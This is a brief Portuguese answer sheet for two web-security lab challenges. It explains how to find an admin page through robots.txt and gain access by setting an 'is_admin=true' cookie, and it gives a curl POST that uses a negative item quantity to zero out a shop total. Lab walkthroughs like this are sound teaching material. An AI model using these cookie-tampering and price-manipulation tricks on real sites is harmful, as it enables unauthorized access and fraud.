# Respostas

- Hidden Admin

Primeiro é necessario acessar o arquivo disponibilizado para os buscadores, onde se localiza todas as paginas do site.

nome_do_site/robots.txt

com isso encontrara o link para a pagina de administrador e acesse essa pagina

agora so faltar setar o Cookie de administrador com esse comando via console do browser.

``` document.cookie="is_admin=true"```

- Banana Shopping

Por meio de uma requisição POST com CURL envie os parametros de forma que o valor fique em zero.

``` curl -X POST -d 'apppe=0&banana=72&grape=0&lemon=-216&mango=0&watermelon=0'  http://lab.shellterlabs.com:33705/ ```
